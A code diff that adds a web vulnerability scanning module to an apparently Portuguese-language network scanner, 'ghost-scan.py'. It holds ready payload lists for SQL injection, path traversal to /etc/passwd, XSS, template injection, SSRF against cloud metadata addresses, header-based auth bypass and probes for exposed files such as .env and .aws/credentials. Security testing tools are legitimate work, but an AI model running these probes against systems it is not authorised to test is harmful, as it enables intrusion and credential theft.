@@ -730,6 +730,13 @@ def scan_host(host, portas, args):
         else:
             _log("IPv6: sem resposta AAAA", "INFO")
 
+    # Web vulnerability scan
+    vuln_findings = []
+    if getattr(args, "vuln", False) and portas_abertas:
+        vuln_findings = vuln_scan_http(ip, portas_abertas,
+                                       timeout=max(args.timeout, 8),
+                                       verbose=args.verbose)
+
     elapsed = time.time() - t_inicio
     _log(f"Scan concluido em {elapsed:.1f}s", "INFO")
 
@@ -743,6 +750,7 @@ def scan_host(host, portas, args):
         "http_fingerprint": http_fp,
         "ssl": ssl_info,
         "ipv6": ipv6_addr,
+        "vulns": vuln_findings,
         "duracao_s": round(elapsed, 2),
     }
 
@@ -798,6 +806,332 @@ td{{padding:5px 10px;border-bottom:1px solid #21262d;font-size:12px;}}
 
 
 # ──────────────────────────────────────────────────────────────────
+# Web Vulnerability Scanner
+# ──────────────────────────────────────────────────────────────────
+
+_SQLI_PAYLOADS = [
+    "'", "''", "`", "\"", "\\",
+    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
+    "1' AND SLEEP(3)--", "1'; WAITFOR DELAY '0:0:3'--",
+    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+    "' AND 1=CONVERT(int,@@version)--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+]
+_SQLI_ERRORS = [
+    "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite_",
+    "syntax error", "unclosed quotation", "quoted string not properly",
+    "you have an error in your sql", "warning: mysql", "sqlstate",
+    "microsoft ole db", "odbc drivers error", "db2 sql error",
+    "supplied argument is not a valid mysql", "division by zero",
+]
+_LFI_PAYLOADS = [
+    "../../../etc/passwd", "../../../../etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "....//....//etc/passwd", "..//..//..//etc/passwd",
+    "..%252f..%252fetc%252fpasswd",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "file:///etc/passwd", "/etc/passwd%00",
+    "C:\\Windows\\win.ini", "..\\..\\..\\Windows\\win.ini",
+]
+_LFI_SIGNATURES = ["root:x:0:0", "daemon:", "bin:x:", "[extensions]", "for 16-bit app"]
+_XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(1)",
+    "<svg onload=alert(1)>",
+    "{{7*7}}",  # SSTI detection
+    "${7*7}",
+]
+_SSRF_URLS = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/metadata/instance",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://0.0.0.0/",
+    "file:///etc/passwd",
+    "dict://127.0.0.1:6379/info",
+]
+_AUTH_BYPASS_HEADERS = [
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Original-URL": "/admin"},
+    {"X-Rewrite-URL": "/admin"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
+    {"X-Forwarded-Host": "localhost"},
+    {"Client-IP": "127.0.0.1"},
+    {"X-Real-IP": "127.0.0.1"},
+]
+_SENSITIVE_PATHS = [
+    "/.env", "/.git/config", "/config.php", "/wp-config.php",
+    "/web.config", "/appsettings.json", "/.aws/credentials",
+    "/phpinfo.php", "/info.php", "/server-status", "/server-info",
+    "/.DS_Store", "/backup.zip", "/backup.tar.gz", "/dump.sql",
+    "/robots.txt", "/sitemap.xml", "/.htpasswd", "/crossdomain.xml",
+    "/swagger.json", "/api/swagger.json", "/openapi.json",
+    "/actuator", "/actuator/env", "/actuator/health",
+    "/.well-known/security.txt", "/debug", "/console",
+    "/admin", "/administrator", "/manager", "/phpmyadmin",
+]
+
+
+def _http_vuln(url, method="GET", body=None, headers=None, timeout=8):
+    """HTTP helper minimo para vuln scan."""
+    import urllib.request as _ur, urllib.parse as _up, ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    h = {"User-Agent": "Mozilla/5.0 (compatible; GhostScan/1.0)"}
+    if headers:
+        h.update(headers)
+    req = _ur.Request(url, data=body, method=method)
+    for k, v in h.items():
+        req.add_header(k, v)
+    try:
+        with _ur.urlopen(req, timeout=timeout, context=ctx) as r:
+            return r.status, dict(r.headers), r.read(32768)
+    except _ur.error.HTTPError as e:
+        return e.code, dict(e.headers), b""
+    except Exception:
+        return 0, {}, b""
+
+
+def _base_urls(host, portas_abertas):
+    """Monta lista de base URLs HTTP/HTTPS a partir das portas abertas."""
+    urls = []
+    for p in portas_abertas:
+        porta = p.get("porta", 0)
+        if porta in (443, 8443, 4443):
+            urls.append(f"https://{host}:{porta}")
+        elif porta in (80, 8080, 8000, 8008, 3000, 5000, 9090):
+            urls.append(f"http://{host}:{porta}")
+    if not urls:
+        urls.append(f"http://{host}")
+    return list(dict.fromkeys(urls))
+
+
+def _encontrar_params(url, timeout=8):
+    """Busca parametros GET/POST na pagina principal e forms."""
+    params = []
+    try:
+        status, headers, body = _http_vuln(url, timeout=timeout)
+        if status == 0:
+            return params
+        texto = body.decode("utf-8", errors="ignore")
+        # Parametros na URL de redirecionamento
+        import re
+        params += re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{0,30})=', texto)
+        # Input fields em forms
+        params += re.findall(r'<input[^>]+name=["\']([^"\']{1,30})["\']', texto, re.I)
+        # JSON keys
+        params += re.findall(r'"([a-zA-Z_][a-zA-Z0-9_]{0,20})":\s*"', texto)
+    except Exception:
+        pass
+    seen = set()
+    result = []
+    for p in params:
+        if p.lower() not in seen and p.lower() not in ("submit", "button", "action", "token", "csrf"):
+            seen.add(p.lower())
+            result.append(p)
+    return result[:10]
+
+
+def vuln_scan_sqli(base_url, params, timeout=8, verbose=False):
+    """Testa SQLi em parametros GET encontrados."""
+    achados = []
+    test_params = params if params else ["id", "page", "cat", "user", "q", "search", "item", "product"]
+
+    for param in test_params[:8]:
+        for payload in _SQLI_PAYLOADS[:6]:
+            import urllib.parse as _up
+            url = f"{base_url}/?{param}={_up.quote(payload)}"
+            status, _, body = _http_vuln(url, timeout=timeout)
+            texto = body.decode("utf-8", errors="ignore").lower()
+            for err in _SQLI_ERRORS:
+                if err in texto:
+                    achados.append({
+                        "tipo": "sqli", "severidade": "CRITICO",
+                        "url": url, "param": param, "payload": payload,
+                        "evidencia": err,
+                    })
+                    _log(f"SQLi [{param}]: {err[:60]}", "CRITICO")
+                    break
+            if verbose and status:
+                _log(f"SQLi probe {param}: HTTP {status}", "INFO")
+    return achados
+
+
+def vuln_scan_lfi(base_url, params, timeout=8, verbose=False):
+    """Testa LFI em parametros de arquivo/pagina."""
+    achados = []
+    file_params = [p for p in params if any(k in p.lower() for k in
+                   ("file", "path", "page", "include", "template", "load", "dir", "doc", "view"))]
+    if not file_params:
+        file_params = ["file", "page", "path", "include", "template"]
+
+    for param in file_params[:5]:
+        for payload in _LFI_PAYLOADS[:8]:
+            import urllib.parse as _up
+            url = f"{base_url}/?{param}={_up.quote(payload)}"
+            status, _, body = _http_vuln(url, timeout=timeout)
+            texto = body.decode("utf-8", errors="ignore")
+            for sig in _LFI_SIGNATURES:
+                if sig in texto:
+                    achados.append({
+                        "tipo": "lfi", "severidade": "CRITICO",
+                        "url": url, "param": param, "payload": payload,
+                        "evidencia": sig,
+                    })
+                    _log(f"LFI [{param}]: '{sig}' encontrado", "CRITICO")
+                    break
+            if verbose and status:
+                _log(f"LFI probe {param}: HTTP {status}", "INFO")
+    return achados
+
+
+def vuln_scan_xss(base_url, params, timeout=8, verbose=False):
+    """Testa XSS refletido em parametros GET."""
+    achados = []
+    test_params = params if params else ["q", "search", "name", "msg", "text", "input", "s"]
+
+    for param in test_params[:8]:
+        for payload in _XSS_PAYLOADS[:5]:
+            import urllib.parse as _up
+            url = f"{base_url}/?{param}={_up.quote(payload)}"
+            status, _, body = _http_vuln(url, timeout=timeout)
+            texto = body.decode("utf-8", errors="ignore")
+            # Verifica reflexao do payload
+            if payload in texto or payload.lower() in texto.lower():
+                achados.append({
+                    "tipo": "xss", "severidade": "ALTO",
+                    "url": url, "param": param, "payload": payload,
+                    "evidencia": "payload refletido na resposta",
+                })
+                _log(f"XSS refletido [{param}]: payload na resposta", "ALERTA")
+            # SSTI
+            if "{{7*7}}" in payload or "${7*7}" in payload:
+                if "49" in texto:
+                    achados.append({
+                        "tipo": "ssti", "severidade": "CRITICO",
+                        "url": url, "param": param, "payload": payload,
+                        "evidencia": "7*7=49 calculado pelo template engine",
+                    })
+                    _log(f"SSTI [{param}]: template injection confirmado!", "CRITICO")
+            if verbose and status:
+                _log(f"XSS probe {param}: HTTP {status}", "INFO")
+    return achados
+
+
+def vuln_scan_ssrf(base_url, params, timeout=8, verbose=False):
+    """Testa SSRF em parametros de URL/redirect."""
+    achados = []
+    ssrf_params = [p for p in params if any(k in p.lower() for k in
+                   ("url", "uri", "redirect", "next", "return", "link", "src", "dest", "proxy", "callback", "fetch"))]
+    if not ssrf_params:
+        ssrf_params = ["url", "redirect", "next", "return", "link", "src"]
+
+    for param in ssrf_params[:5]:
+        for ssrf_url in _SSRF_URLS[:4]:
+            import urllib.parse as _up
+            url = f"{base_url}/?{param}={_up.quote(ssrf_url)}"
+            status, headers, body = _http_vuln(url, timeout=timeout)
+            texto = body.decode("utf-8", errors="ignore")
+            # Indicadores de SSRF bem-sucedido
+            if any(sig in texto for sig in ["ami-id", "instance-id", "compute.internal",
+                                             "root:x:0", "metadata", "iam/security"]):
+                achados.append({
+                    "tipo": "ssrf", "severidade": "CRITICO",
+                    "url": url, "param": param, "ssrf_target": ssrf_url,
+                    "evidencia": texto[:100],
+                })
+                _log(f"SSRF [{param}]: metadados internos acessados!", "CRITICO")
+            if verbose and status:
+                _log(f"SSRF probe {param}: HTTP {status}", "INFO")
+    return achados
+
+
+def vuln_scan_auth_bypass(base_url, timeout=8, verbose=False):
+    """Testa bypass de autenticacao via headers e paths sensiveis."""
+    achados = []
+    admin_paths = ["/admin", "/administrator", "/manager", "/api/admin", "/dashboard", "/console"]
+
+    for path in admin_paths:
+        url = f"{base_url}{path}"
+        # Requisicao normal
+        status_normal, _, _ = _http_vuln(url, timeout=timeout)
+        if status_normal in (401, 403):
+            # Tentar bypass com headers
+            for bypass_headers in _AUTH_BYPASS_HEADERS:
+                s, _, body = _http_vuln(url, headers=bypass_headers, timeout=timeout)
+                if s == 200 and len(body) > 100:
+                    achados.append({
+                        "tipo": "auth_bypass", "severidade": "CRITICO",
+                        "url": url, "headers_usados": bypass_headers,
+                        "evidencia": f"HTTP 403 -> HTTP 200 com header {list(bypass_headers.keys())[0]}",
+                    })
+                    _log(f"Auth Bypass [{path}]: {list(bypass_headers.keys())[0]} -> HTTP 200", "CRITICO")
+                    break
+            if verbose:
+                _log(f"Auth bypass probe {path}: HTTP {status_normal}", "INFO")
+    return achados
+
+
+def vuln_scan_exposed_files(base_url, timeout=8, verbose=False):
+    """Busca arquivos e endpoints sensiveis expostos."""
+    achados = []
+    for path in _SENSITIVE_PATHS:
+        url = f"{base_url}{path}"
+        status, headers, body = _http_vuln(url, timeout=timeout)
+        if status in (200, 206):
+            tamanho = len(body)
+            ct = headers.get("Content-Type", "")
+            if tamanho > 20:
+                sev = "CRITICO" if any(k in path for k in (".env", ".git", "credentials", "config", "dump", "backup", "shadow")) else "ALTO"
+                achados.append({
+                    "tipo": "exposed_file", "severidade": sev,
+                    "url": url, "status": status,
+                    "tamanho": tamanho, "content_type": ct,
+                    "evidencia": body[:80].decode("utf-8", errors="ignore"),
+                })
+                _log(f"Arquivo exposto [{path}]: HTTP {status} ({tamanho}B)", sev)
+        if verbose and status and status != 404:
+            _log(f"Path probe {path}: HTTP {status}", "INFO")
+    return achados
+
+
+def vuln_scan_http(host, portas_abertas, timeout=8, verbose=False):
+    """Orquestra todos os checks de vuln web em um host."""
+    _secao("WEB VULNERABILITY SCAN")
+    todos_achados = []
+    base_urls = _base_urls(host, portas_abertas)
+
+    if not base_urls:
+        _log("Nenhuma porta web detectada para vuln scan", "INFO")
+        return todos_achados
+
+    for base_url in base_urls[:3]:
+        _log(f"Testando: {base_url}", "INFO")
+
+        # Descobrir parametros
+        params = _encontrar_params(base_url, timeout=timeout)
+        if verbose and params:
+            _log(f"Parametros encontrados: {params}", "INFO")
+
+        todos_achados += vuln_scan_exposed_files(base_url, timeout=timeout, verbose=verbose)
+        todos_achados += vuln_scan_sqli(base_url, params, timeout=timeout, verbose=verbose)
+        todos_achados += vuln_scan_lfi(base_url, params, timeout=timeout, verbose=verbose)
+        todos_achados += vuln_scan_xss(base_url, params, timeout=timeout, verbose=verbose)
+        todos_achados += vuln_scan_ssrf(base_url, params, timeout=timeout, verbose=verbose)
+        todos_achados += vuln_scan_auth_bypass(base_url, timeout=timeout, verbose=verbose)
+
+    criticos = sum(1 for a in todos_achados if a.get("severidade") == "CRITICO")
+    altos = sum(1 for a in todos_achados if a.get("severidade") == "ALTO")
+    _log(f"Vuln scan concluido: {len(todos_achados)} finding(s) | {criticos} CRITICO | {altos} ALTO", "OK")
+    return todos_achados
+
+
+# ──────────────────────────────────────────────────────────────────
 # CLI / main
 # ──────────────────────────────────────────────────────────────────
 
@@ -819,6 +1153,7 @@ _SCAN_HELP = """\033[92mOpcoes de Scan:\033[0m
   \033[1m--passive\033[0m          Modo passivo - sem SYN raw, apenas connect()
   \033[1m--exclude-cdn\033[0m      Pular IPs de CDN (Cloudflare, Akamai, Fastly)
   \033[1m-T N\033[0m               Timing: 0=paranoid 1=sneaky 2=polite 3=normal 4=agg 5=insane
+  \033[1m--vuln\033[0m             Web vuln scan: SQLi, LFI, XSS, SSRF, auth bypass, exposed files
 
 \033[92mRede e Output:\033[0m
   \033[1m--ipv6\033[0m             Scan IPv6
@@ -836,6 +1171,7 @@ _SCAN_HELP = """\033[92mOpcoes de Scan:\033[0m
   python ghost-scan.py -t exemplo.com -p 1-65535 --fast --output resultado.json
   python ghost-scan.py --targets-file alvos.txt -p top100 --ssl --os-detect
   python ghost-scan.py -t 10.0.0.0/8 --rate 5000 -T 4 --jsonl saida.jsonl
+  python ghost-scan.py -t exemplo.com --vuln --http-fp --banner
 
 \033[2mUse: python ghost-scan.py --help  para ver todos os flags disponiveis\033[0m
 """
@@ -896,6 +1232,8 @@ def main():
                         help="Excluir IPs de CDN conhecidos (Cloudflare, Akamai, Fastly, etc.)")
     parser.add_argument("--jsonl", metavar="FILE",
                         help="Saida JSON Lines (streaming, um resultado por linha)")
+    parser.add_argument("--vuln", action="store_true",
+                        help="Web vuln scan: SQLi, LFI, XSS, SSRF, auth bypass, arquivos expostos")
 
     args = parser.parse_args()
 
